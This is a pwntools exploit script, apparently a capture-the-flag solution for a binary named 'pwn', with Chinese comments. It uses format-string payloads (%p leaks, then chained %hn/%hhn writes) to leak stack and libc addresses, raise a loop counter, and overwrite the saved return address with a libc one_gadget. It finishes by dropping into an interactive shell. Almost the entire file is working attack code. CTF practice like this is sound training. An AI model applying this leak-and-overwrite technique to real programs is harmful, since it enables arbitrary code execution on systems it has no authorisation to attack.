from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
io=process('./pwn')
#io=remote('node4.buuoj.cn',)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive


def lg(var):
    for name, value in globals().items():
        if value is var:
            log.info(f"{name} => {hex(var)}")
            return
def fl():
    ru(b'flag')
gdb.attach(io,'''
b *$rebase(0xB27)
b *$rebase(0xB05)
''')
pause()


ru(b'Give me your name:')

sl(b'666')

ru(b'favourite food:')
#首先需要更改i的大小，3次根本就不够用
#泄露栈地址和libc地址
payload1=b's%11$pl%9$p'

sl(payload1)
ru(b's0x')
rbp= int(io.recv(12),16)-0xe8
lg(rbp)
ru(b'l0x')

libc= int(io.recv(12),16)-0x20830
lg(libc)
#使i的地址出现在栈上
word=(rbp-0xc)&0xffff
payload1=f'%{word}c%11$hnflag'
payload1=payload1.encode()
sl(payload1)
fl()

#更改i地址里的内容
word=5
payload2=f'%{word}c%37$hhnflag'
payload2=payload2.encode()
sl(payload2)


fl()

#改oneget
#使之出现在栈上
#set tow byte
add=rbp+8
word=add&0xffff
payload3=f'%{word}c%11$hnflag'
payload3=payload3.encode()
sl(payload3)
fl()
#改地址
oneget=libc+0x45216#+0x45226#0xf1247#0xf03a4#+0x4527a
word=oneget&0xffff
lg(oneget)
lg(word)

payload4=f'%{word}c%37$hnflag'
payload4=payload4.encode()
sl(payload4)
fl()

#set one byte
add=rbp+8+2
word=add&0xffff
payload5=f'%{word}c%11$hnflag'
payload5=payload5.encode()
sl(payload5)
fl()
#改地址
oneget=libc+0x45216#+0x45226#0xf1247#0xf03a4#+0x4527a
word=oneget&0xffffff
word=word>>16
lg(oneget)
lg(word)

payload6=f'%{word}c%37$hhnflag'
payload6=payload6.encode()
sl(payload6)
fl()





ii()
